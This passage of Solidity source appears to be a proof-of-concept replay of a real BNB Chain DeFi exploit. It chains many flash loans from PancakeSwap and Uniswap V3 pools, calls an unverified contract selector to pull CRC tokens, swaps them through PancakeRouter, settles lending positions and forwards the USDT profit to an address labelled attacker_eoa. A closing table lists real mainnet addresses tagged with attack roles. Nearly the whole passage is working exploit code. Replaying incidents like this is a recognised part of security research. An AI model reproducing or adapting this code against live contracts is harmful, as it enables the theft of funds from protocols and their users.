        IERC20Like(Addresses.USDT).approve(Addresses.vUSDT, usdtApproveAllowance_3);
        bytes memory flashLoanProof = abi.encode(address(0));
        IERC1967Proxy(Addresses.ERC1967Proxy).flashLoan(Addresses.WBNB, 407886133720385914518703, flashLoanProof);

        uint256 usdtBalanceOfAttackHelper = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, usdtBalanceOfAttackHelper);
    }

    function flashCallback3() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037102, 1208326366169011543321669
        );
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.UniswapV3Pool);
        bytes memory flashProof =
            abi.encode(0x000000000000000000003945C24cf39106BDce81, 0x0000000000000000000000000000000000000014);
        IUniswapV3Pool(Addresses.UniswapV3Pool).flash(address(this), 270461715697801533181569, 0, flashProof);
    }

    function flashCallback4() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037085, 15049178034074220185185148
        );
        IPancakeV3Pool_2CCE(Addresses.PancakeV3Pool_2CCE).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_2CCE);
        bytes memory flashProof =
            abi.encode(0x0000000000000000000212d75159c2CC7d60Aa9c, 0x0000000000000000000000000000000000000003);
        IPancakeV3Pool_2CCE(Addresses.PancakeV3Pool_2CCE).flash(address(this), 2506826147827333048871580, 0, flashProof);
    }

    function flashCallback5() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037094, 884513478239517283741784
        );
        IPancakeV3Pool_4577(Addresses.PancakeV3Pool_4577).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_4577);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000BaFDB1a18B3770CcDe9E, 0x000000000000000000000000000000000000000C);
        IPancakeV3Pool_4577(Addresses.PancakeV3Pool_4577).flash(address(this), 883039991729088721903262, 0, flashProof);
    }

    function flashCallback6() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037087, 1939496862180796848068869
        );
        IUniswapV3Pool_E507(Addresses.UniswapV3Pool_E507).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.UniswapV3Pool_E507);
        bytes memory flashProof =
            abi.encode(0x0000000000000000000009050f7f495F5b15C06b, 0x0000000000000000000000000000000000000005);
        IUniswapV3Pool_E507(Addresses.UniswapV3Pool_E507).flash(address(this), 42594648758101864726635, 0, flashProof);
    }

    function flashCallback7() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037086, 2507076830442115782176469
        );
        IPancakeV3Pool_7650(Addresses.PancakeV3Pool_7650).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_7650);
        bytes memory flashProof =
            abi.encode(0x000000000000000000019aA9d295747c48792beD, 0x0000000000000000000000000000000000000004);
        IPancakeV3Pool_7650(Addresses.PancakeV3Pool_7650).flash(address(this), 1939302931887608087260141, 0, flashProof);
    }

    function flashCallback8() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037106, 2496087945302749465951555
        );
        IPancakeV3Pool_AD17(Addresses.PancakeV3Pool_AD17).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_AD17);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000df5a054265B67589d198, 0x0000000000000000000000000000000000000018);
        IPancakeV3Pool_AD17(Addresses.PancakeV3Pool_AD17).flash(address(this), 1054748311623717725262232, 0, flashProof);
    }

    function flashCallback9() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037100, 694652588301955153618146
        );
        IPancakeV3Pool_5672(Addresses.PancakeV3Pool_5672).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_5672);
        bytes memory flashProof =
            abi.encode(0x0000000000000000000093B7D62Ff987324A41fB, 0x0000000000000000000000000000000000000012);
        IPancakeV3Pool_5672(Addresses.PancakeV3Pool_5672).flash(address(this), 697579060976133775966715, 0, flashProof);
    }

    function flashCallback10() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037101, 697648818882231389344313
        );
        IPancakeV3Pool_C1AF(Addresses.PancakeV3Pool_C1AF).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_C1AF);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000ffd8f430b5032882129c, 0x0000000000000000000000000000000000000013);
        IPancakeV3Pool_C1AF(Addresses.PancakeV3Pool_C1AF).flash(address(this), 1208205545614450098311836, 0, flashProof);
    }

    function flashCallback11() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037110, 359618388390069093532705
        );
        IPancakeV3Pool_0AA9(Addresses.PancakeV3Pool_0AA9).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_0AA9);
        bytes memory flashProof =
            abi.encode(0x000000000000000000024C1cbc26D8F999f1eE5c, 0x000000000000000000000000000000000000001c);
        IPancakeV3Pool_0AA9(Addresses.PancakeV3Pool_0AA9).flash(address(this), 0, 2777281558523710039780956, flashProof);
    }

    function flashCallback12() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037093, 50866885009936625900569
        );
        IPancakeV3Pool_82D8(Addresses.PancakeV3Pool_82D8).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_82D8);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000bb48c6fa552C6AD584aD, 0x000000000000000000000000000000000000000b);
        IPancakeV3Pool_82D8(Addresses.PancakeV3Pool_82D8).flash(address(this), 884425035735943689372845, 0, flashProof);
    }

    function flashCallback13() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037107, 1054853786454880097034760
        );
        IPancakeV3Pool_CEA5(Addresses.PancakeV3Pool_CEA5).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_CEA5);
        bytes memory flashProof =
            abi.encode(0x0000000000000000000091fe769046638b2fd675, 0x0000000000000000000000000000000000000019);
        IPancakeV3Pool_CEA5(Addresses.PancakeV3Pool_CEA5).flash(address(this), 689437156416707254802037, 0, flashProof);
    }

    function flashCallback14() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037111, 2777559286679562410784936
        );
        IPancakeV3Pool_604A(Addresses.PancakeV3Pool_604A).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_604A);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000A662e38680ad3CC9443E, 0x000000000000000000000000000000000000001D);
        IPancakeV3Pool_604A(Addresses.PancakeV3Pool_604A).flash(address(this), 785737012008559667921982, 0, flashProof);
    }

    function flashCallback15() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037097, 11173772920489211644655
        );
        IPancakeV3Pool_EDE5(Addresses.PancakeV3Pool_EDE5).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_EDE5);
        bytes memory flashProof =
            abi.encode(0x000000000000000000004F41665A1dB4bDBd67C8, 0x000000000000000000000000000000000000000F);
        IPancakeV3Pool_EDE5(Addresses.PancakeV3Pool_EDE5).flash(address(this), 374273365751494979971016, 0, flashProof);
    }

    function flashCallback16() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037095, 883128295728261630775454
        );
        IPancakeV3Pool_9E6B(Addresses.PancakeV3Pool_9E6B).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_9E6B);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000000102E43C04b3044788, 0x000000000000000000000000000000000000000d);
        IPancakeV3Pool_9E6B(Addresses.PancakeV3Pool_9E6B).flash(address(this), 0, 18655101547356374920, flashProof);
    }

    function flashCallback17() internal {
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
    }

    function flashCallback18() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037112, 785815585709760523888776
        );
        IERC20Like(Addresses.CRC).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        uint256 crcBalanceOfAttackerEoa = IERC20Like(Addresses.CRC).balanceOf(Addresses.attacker_eoa);
        (bool ok,) = 0xdB72c97a747424d927b4638b37C9735823BCE3a6
        .call(abi.encodeWithSelector(bytes4(0x9a493a24), Addresses.CRC, address(this), 45144000000000000000000));
        require(ok, "selector 0x9a493a24 failed");
        IERC20Like(Addresses.CRC).balanceOf(address(this));
        IERC20Like(Addresses.CRC).balanceOf(Addresses.Cake_LP);
        uint256 usdtBalanceOfAttackHelper = IERC20Like(Addresses.USDT).balanceOf(address(this));
        if (usdtBalanceOfAttackHelper != 0) {
            IPancakeRouter(Addresses.PancakeRouter)
                .swapTokensForExactTokens(
                    35862714912768051805032649,
                    usdtBalanceOfAttackHelper,
                    _addressArray2(Addresses.USDT, Addresses.CRC),
                    0xa5341a83807503Ed8DEcb8534605494551C2a196,
                    1784195067
                );
        }
        IERC20Like(Addresses.CRC).balanceOf(address(this));
        uint256 swapAmountIn = 45144000000000000000000;
        if (swapAmountIn != 0) {
            IPancakeRouter(Addresses.PancakeRouter)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    swapAmountIn, 0, _addressArray2(Addresses.CRC, Addresses.USDT), address(this), 1784195067
                );
        }
        IvUSDT(Addresses.vUSDT).repayBorrow(62748558395125556834569335);
        IvWBNB(Addresses.vWBNB).redeemUnderlying(372886133720385914518703);
        uint256 repayLiveAmount = 13027427308396910820958539; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IInitializableImmutableAdminUpgradeabilityProxy_6807DC(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC
            ).repay(Addresses.USDT, repayLiveAmount, 2, address(this));
        IInitializableImmutableAdminUpgradeabilityProxy_6807DC(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC
            ).withdraw(Addresses.WBNB, 34999999999999999999900, address(this));
        uint256 transferLiveAmount = 29959335680826088531448091; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_3121, transferLiveAmount);
    }

    function flashCallback19() internal {
        uint256 transferLiveAmount_2 = 5341861169151331053010932; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_EB0F, transferLiveAmount_2);
        uint256 transferLiveAmount_3 = 15049178034074220185185148; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_94E4, transferLiveAmount_3);
        uint256 transferLiveAmount_4 = 2507076830442115782176469; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_2CCE, transferLiveAmount_4);
        uint256 transferLiveAmount_5 = 1939496862180796848068869; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_7650, transferLiveAmount_5);
        uint256 transferLiveAmount_6 = 42598908222977674913109; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.UniswapV3Pool_E507, transferLiveAmount_6);
        uint256 transferLiveAmount_7 = 5032768537093067621317062; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_F849, transferLiveAmount_7);
        uint256 transferLiveAmount_8 = 61363924168531229035329; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_7057, transferLiveAmount_8);
        uint256 transferLiveAmount_9 = 595345819191560429770793; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_DA61, transferLiveAmount_9);
        uint256 transferLiveAmount_10 = 1109367016852969622471522; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_9818, transferLiveAmount_10);
        uint256 transferLiveAmount_11 = 50866885009936625900569; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_99DE, transferLiveAmount_11);
    }

    function flashCallback20() internal {
        uint256 transferLiveAmount_12 = 884513478239517283741784; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_82D8, transferLiveAmount_12);
        uint256 transferLiveAmount_13 = 883128295728261630775454; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_4577, transferLiveAmount_13);
        uint256 transferLiveAmount_14 = 18656967057511110559; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_9E6B, transferLiveAmount_14);
        uint256 transferLiveAmount_15 = 11173772920489211644655; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_7A4A, transferLiveAmount_15);
        uint256 transferLiveAmount_16 = 374310793088070129469015; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_EDE5, transferLiveAmount_16);
        uint256 transferLiveAmount_17 = 710621806676725126816074; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_D759, transferLiveAmount_17);
        uint256 transferLiveAmount_18 = 694652588301955153618146; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, transferLiveAmount_18);
        uint256 transferLiveAmount_19 = 697648818882231389344313; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_5672, transferLiveAmount_19);
        uint256 transferLiveAmount_20 = 1208326366169011543321669; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_C1AF, transferLiveAmount_20);
        uint256 transferLiveAmount_21 = 270488761869371313334889; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.UniswapV3Pool, transferLiveAmount_21);
    }

    function flashCallback21() internal {
        uint256 transferLiveAmount_22 = 118906600751632730236672; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.UniswapV3Pool_8032, transferLiveAmount_22);
        uint256 transferLiveAmount_23 = 688448340405270672736498; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.UniswapV3Pool_CA9C, transferLiveAmount_23);
        uint256 transferLiveAmount_24 = 2496087945302749465951555; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_3196, transferLiveAmount_24);
        uint256 transferLiveAmount_25 = 1054853786454880097034760; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_AD17, transferLiveAmount_25);
        uint256 transferLiveAmount_26 = 689506100132348925527519; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_CEA5, transferLiveAmount_26);
        uint256 transferLiveAmount_27 = 634363126307868764785252; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_5C9A, transferLiveAmount_27);
        uint256 transferLiveAmount_28 = 359618388390069093532705; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_107C, transferLiveAmount_28);
        uint256 transferLiveAmount_29 = 2777559286679562410784936; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_0AA9, transferLiveAmount_29);
        uint256 transferLiveAmount_30 = 785815585709760523888776; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_604A, transferLiveAmount_30);
        IVault_238A35(Addresses.Vault_238A35).sync(Addresses.USDT);
    }

    function flashCallback22() internal {
        uint256 transferFlowAmount = 31900027981457748304839723;
        IERC20Like(Addresses.USDT).transfer(Addresses.Vault_238A35, transferFlowAmount);
        IVault_238A35(Addresses.Vault_238A35).settle();
    }

    function flashCallback23() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037108, 689506100132348925527519
        );
        IPancakeV3Pool_5C9A(Addresses.PancakeV3Pool_5C9A).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_5C9A);
        bytes memory flashProof =
            abi.encode(0x0000000000000000000086517497A3cd4B3ebA71, 0x000000000000000000000000000000000000001a);
        IPancakeV3Pool_5C9A(Addresses.PancakeV3Pool_5C9A).flash(address(this), 0, 634299696338234941291121, flashProof);
    }

    function flashCallback24() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037089, 5032768537093067621317062
        );
        IPancakeV3Pool_7057(Addresses.PancakeV3Pool_7057).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_7057);
        bytes memory flashProof =
            abi.encode(0x000000000000000000000CFE365e1CEDfA4DB843, 0x0000000000000000000000000000000000000007);
        IPancakeV3Pool_7057(Addresses.PancakeV3Pool_7057).flash(address(this), 61357788389692259809347, 0, flashProof);
    }

    function flashCallback25() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037090, 61363924168531229035329
        );
        IPancakeV3Pool_DA61(Addresses.PancakeV3Pool_DA61).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_DA61);
        bytes memory flashProof =
            abi.encode(0x000000000000000000007E0e88d348a84E408518, 0x0000000000000000000000000000000000000008);
        IPancakeV3Pool_DA61(Addresses.PancakeV3Pool_DA61).flash(address(this), 0, 595286290562504179352856, flashProof);
    }

    function flashCallback26() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037084, 5341861169151331053010932
        );
        IPancakeV3Pool_94E4(Addresses.PancakeV3Pool_94E4).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_94E4);
        bytes memory flashProof =
            abi.encode(0x0000000000000000000C72780098e5060E5DCdA2, 0x0000000000000000000000000000000000000002);
        IPancakeV3Pool_94E4(Addresses.PancakeV3Pool_94E4)
            .flash(address(this), 15047673266747545430642082, 0, flashProof);
    }

    function flashCallback27() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037091, 595345819191560429770793
        );
        IPancakeV3Pool_9818(Addresses.PancakeV3Pool_9818).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_9818);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000EAE4e4a8a7a006793D4e, 0x0000000000000000000000000000000000000009);
        IPancakeV3Pool_9818(Addresses.PancakeV3Pool_9818).flash(address(this), 1109256091243845237947726, 0, flashProof);
    }

    function flashCallback28() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037083, 29959335680826088531448091
        );
        IPancakeV3Pool_EB0F(Addresses.PancakeV3Pool_EB0F).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_EB0F);
        bytes memory flashProof =
            abi.encode(0x000000000000000000046B11EB3955aAC2B9911C, 0x0000000000000000000000000000000000000001);
        IPancakeV3Pool_EB0F(Addresses.PancakeV3Pool_EB0F).flash(address(this), 5341327036447686284382492, 0, flashProof);
    }

    function flashCallback29() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037092, 1109367016852969622471522
        );
        IPancakeV3Pool_99DE(Addresses.PancakeV3Pool_99DE).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_99DE);
        bytes memory flashProof =
            abi.encode(0x000000000000000000000ac539406E9304895C92, 0x000000000000000000000000000000000000000A);
        IPancakeV3Pool_99DE(Addresses.PancakeV3Pool_99DE).flash(address(this), 0, 50861798830053620538514, flashProof);
    }

    function flashCallback30() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037099, 710621806676725126816074
        );
        IPancakeV3Pool(Addresses.PancakeV3Pool).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool);
        bytes memory flashProof =
            abi.encode(0x0000000000000000000093156D4AF9d014F73e99, 0x0000000000000000000000000000000000000011);
        IPancakeV3Pool(Addresses.PancakeV3Pool).flash(address(this), 694583129988956257992345, 0, flashProof);
    }

    function flashCallback31() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037109, 634363126307868764785252
        );
        IPancakeV3Pool_107C(Addresses.PancakeV3Pool_107C).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_107C);
        bytes memory flashProof =
            abi.encode(0x000000000000000000004C2500Aa3d6149b3A3c6, 0x000000000000000000000000000000000000001B);
        IPancakeV3Pool_107C(Addresses.PancakeV3Pool_107C).flash(address(this), 359582430147054388093894, 0, flashProof);
    }

    function flashCallback32() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037098, 374310793088070129469015
        );
        IPancakeV3Pool_D759(Addresses.PancakeV3Pool_D759).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_D759);
        bytes memory flashProof =
            abi.encode(0x000000000000000000009677088Eb2653546FcC1, 0x0000000000000000000000000000000000000010);
        IPancakeV3Pool_D759(Addresses.PancakeV3Pool_D759).flash(address(this), 710550751601564970319041, 0, flashProof);
    }

    function flashCallback33() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037096, 18656967057511110559
        );
        IPancakeV3Pool_7A4A(Addresses.PancakeV3Pool_7A4A).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_7A4A);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000025dABbE92E2Ef95e916, 0x000000000000000000000000000000000000000E);
        IPancakeV3Pool_7A4A(Addresses.PancakeV3Pool_7A4A).flash(address(this), 0, 11172655654923719272726, flashProof);
    }

    function _handleFlash() internal {
        IVault_238A35(Addresses.Vault_238A35).take(Addresses.USDT, address(this), 31900027981457748304839723);
        IPancakeV3Pool_3121(Addresses.PancakeV3Pool_3121).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_3121);
        bytes memory flashProof = abi.encode(0x00000000000000000018c78072AB24431B1EF1B1, address(0));
        IPancakeV3Pool_3121(Addresses.PancakeV3Pool_3121)
            .flash(address(this), 29956340046821406390809009, 0, flashProof);
    }

    function flashCallback34() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037104, 118906600751632730236672
        );
        IUniswapV3Pool_CA9C(Addresses.UniswapV3Pool_CA9C).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.UniswapV3Pool_CA9C);
        bytes memory flashProof =
            abi.encode(0x0000000000000000000091C520AA93eE09Ed81D3, 0x0000000000000000000000000000000000000016);
        IUniswapV3Pool_CA9C(Addresses.UniswapV3Pool_CA9C).flash(address(this), 0, 688379502455025170219475, flashProof);
    }

    function flashCallback35() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037103, 270488761869371313334889
        );
        IUniswapV3Pool_8032(Addresses.UniswapV3Pool_8032).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.UniswapV3Pool_8032);
        bytes memory flashProof =
            abi.encode(0x00000000000000000000192D4B931a70e6112276, 0x0000000000000000000000000000000000000015);
        IUniswapV3Pool_8032(Addresses.UniswapV3Pool_8032).flash(address(this), 118894711280504679768694, 0, flashProof);
    }

    function flashCallback36() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037105, 688448340405270672736498
        );
        IPancakeV3Pool_3196(Addresses.PancakeV3Pool_3196).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_3196);
        bytes memory flashProof =
            abi.encode(0x000000000000000000021083aB2eDb80751e344A, 0x0000000000000000000000000000000000000017);
        IPancakeV3Pool_3196(Addresses.PancakeV3Pool_3196).flash(address(this), 2495838361466602805670986, 0, flashProof);
    }

    function flashCallback37() internal {
        _setAttackState(
            87903029871075914254377627908054574944891091886930582284385770809450030037088, 42598908222977674913109
        );
        IPancakeV3Pool_F849(Addresses.PancakeV3Pool_F849).token0();
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_F849);
        bytes memory flashProof =
            abi.encode(0x00000000000000000004299FA62c2fd942F22AC3, 0x0000000000000000000000000000000000000006);
        IPancakeV3Pool_F849(Addresses.PancakeV3Pool_F849).flash(address(this), 5032265310562011420175043, 0, flashProof);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeV3Pool = 0x0022f0dcd574A1e646250eEbD086781823434504; // Addresses.PancakeV3Pool = 0x0022f0dcd574a1e646250eebd086781823434504 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Addresses.PancakeRouter = 0x10ed43c718714eb63d5aa57b78b54704e256024e label=PancakeRouter roles=attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_F849 = 0x172fcD41E0913e95784454622d1c3724f546f849; // Addresses.PancakeV3Pool_F849 = 0x172fcd41e0913e95784454622d1c3724f546f849 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_3196 = 0x1c3865814aCbBa11E7196dF0b46c024472503196; // Addresses.PancakeV3Pool_3196 = 0x1c3865814acbba11e7196df0b46c024472503196 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Vault_238A35 = 0x238a358808379702088667322f80aC48bAd5e6c4; // Addresses.Vault_238A35 = 0x238a358808379702088667322f80ac48bad5e6c4 label=Vault roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_107C = 0x24618d12b5eA15bB6fe3c81bBb9E011b5D5b107c; // Addresses.PancakeV3Pool_107C = 0x24618d12b5ea15bb6fe3c81bbb9e011b5d5b107c label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool = 0x2C3c320D49019D4f9A92352e947c7e5AcFE47D68; // Addresses.UniswapV3Pool = 0x2c3c320d49019d4f9a92352e947c7e5acfe47d68 label=UniswapV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attack_child = 0x2eadBCDCd4Ab4bb7F8b01610794Ea09A64CD5DA1; // Addresses.attack_child = 0x2eadbcdcd4ab4bb7f8b01610794ea09a64cd5da1 label=attack_child roles=asset|attacker_callback_contract|attacker_contract|attacker_surface_contract|code_contract|contract|attack_child_contract|economic_holder|localized_contract|attack_address|poc_reconstruction_surface|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attacker_eoa = 0x34579eA92a07a88F5505dFaA4D99Ab94b2784087; // Addresses.attacker_eoa = 0x34579ea92a07a88f5505dfaa4d99ab94b2784087 label=attacker_eoa roles=attacker_eoa|contract|economic_holder|attack_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant PancakeV3Pool_9818 = 0x4f3126d5DE26413AbDCF6948943FB9D0847d9818; // Addresses.PancakeV3Pool_9818 = 0x4f3126d5de26413abdcf6948943fb9d0847d9818 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955; // Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=BEP20USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
